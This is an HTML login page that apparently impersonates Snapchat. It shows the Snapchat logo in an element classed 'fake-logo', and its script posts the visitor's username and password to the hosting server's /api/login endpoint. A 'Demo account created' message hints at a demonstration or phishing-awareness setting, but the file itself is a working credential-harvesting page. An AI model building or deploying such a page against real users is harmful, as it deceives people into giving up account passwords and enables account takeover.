<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Log In</title>
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: -apple-system, "Segoe UI", Arial, sans-serif;
      background-color: #f3f3f3;
      margin: 0; padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .card {
      background: #ffffff;
      border-radius: 20px;
      box-shadow: 0 4px 24px rgba(0,0,0,0.06);
      padding: 40px 32px 32px;
      width: 340px;
      text-align: center;
    }

    h1 {
      font-size: 22px;
      font-weight: 600;
      color: #111;
      margin: 0 0 20px;
    }

    label {
      display: block;
      text-align: left;
      font-size: 13px;
      font-weight: 600;
      color: #444;
      margin-bottom: 6px;
      margin-top: 16px;
    }
    label:first-of-type { margin-top: 0; }

    .password-container { position: relative; }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px 14px;
      border: 1px solid #dcdcdc;
      border-radius: 10px;
      font-size: 14px;
    }
    .password-container input { padding-right: 44px; }
    input:focus {
      outline: none;
      border-color: #1a8fe3;
      box-shadow: 0 0 0 3px rgba(26,143,227,0.12);
    }
    .toggle-password {
      position: absolute;
      right: 10px;
      top: 12px;
      background: none;
      border: none;
      cursor: pointer;
      font-size: 13px;
      color: #888;
    }

    .server-message {
      display: none;
      padding: 10px;
      margin-top: 14px;
      border-radius: 8px;
      font-size: 13px;
      text-align: left;
    }
    .server-message.error {
      display: block;
      background-color: #fff0f0;
      color: #cc0000;
      border: 1px solid #f5c6c6;
    }
    .server-message.success {
      display: block;
      background-color: #f0fff4;
      color: #007a33;
      border: 1px solid #b2dfcc;
    }

    .login-button {
      width: 100%;
      padding: 13px;
      margin-top: 22px;
      background-color: #1a8fe3;
      border: none;
      border-radius: 24px;
      font-size: 15px;
      font-weight: 700;
      color: #ffffff;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }
    .login-button:hover { background-color: #1478c2; }
    .login-button:disabled { background-color: #a7abad; cursor: default; }

    .hint {
      font-size: 11px;
      color: #999;
      margin-top: 14px;
      line-height: 1.4;
    }
  </style>
</head>
<body>

  <div class="card">

      <div class="fake-logo">
        <img src="img/snapchat.png" alt="logo" width="64" height="64">
      </div>
    
    <h1>Log In</h1>

    <form onsubmit="return handleLogin(event)">

      <label for="username">Username or Email</label>
      <input type="text" id="username" name="name" required>

      <label for="password">Password</label>
      <div class="password-container">
        <input type="password" id="password" name="message" required>
        <button type="button" class="toggle-password" id="toggle-password">Show</button>
      </div>

      <div id="server-message" class="server-message"></div>

      <button type="submit" class="login-button" id="login-btn">Log In</button>

      <p class="hint"></p>

    </form>

  </div>

  <script>
    // Same server serves both the page and the API.
    const SERVER_URL = '';

    async function handleLogin(event) {
      event.preventDefault();

      const usernameOrEmail = document.getElementById('username').value.trim();
      const password         = document.getElementById('password').value;
      const serverMsg        = document.getElementById('server-message');
      const loginBtn          = document.getElementById('login-btn');

      serverMsg.className   = 'server-message';
      serverMsg.textContent = '';

      if (password.length < 8) {
        serverMsg.className   = 'server-message error';
        serverMsg.textContent = 'Password must be at least 8 characters.';
        return false;
      }

      loginBtn.textContent = 'Logging in…';
      loginBtn.disabled    = true;

      try {
        const res  = await fetch(`${SERVER_URL}/api/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: usernameOrEmail, password })
        });
        const data = await res.json();

        if (res.ok) {
          serverMsg.className   = 'server-message success';
          serverMsg.textContent = data.isNewAccount
            ? 'Demo account created and logged in!'
            : 'Login successful!';
        } else {
          serverMsg.className   = 'server-message error';
          serverMsg.textContent = data.error || 'Login failed. Please try again.';
        }
      } catch (err) {
        serverMsg.className   = 'server-message error';
        serverMsg.textContent = 'Could not reach the server. Please try again.';
      }

      loginBtn.textContent = 'Log In';
      loginBtn.disabled    = false;
      return false;
    }

    document.getElementById('toggle-password').addEventListener('click', function () {
      const passwordField = document.getElementById('password');
      if (passwordField.type === 'password') {
        passwordField.type = 'text';
        this.textContent = 'Hide';
      } else {
        passwordField.type = 'password';
        this.textContent = 'Show';
      }
    });
  </script>

</body>
</html>
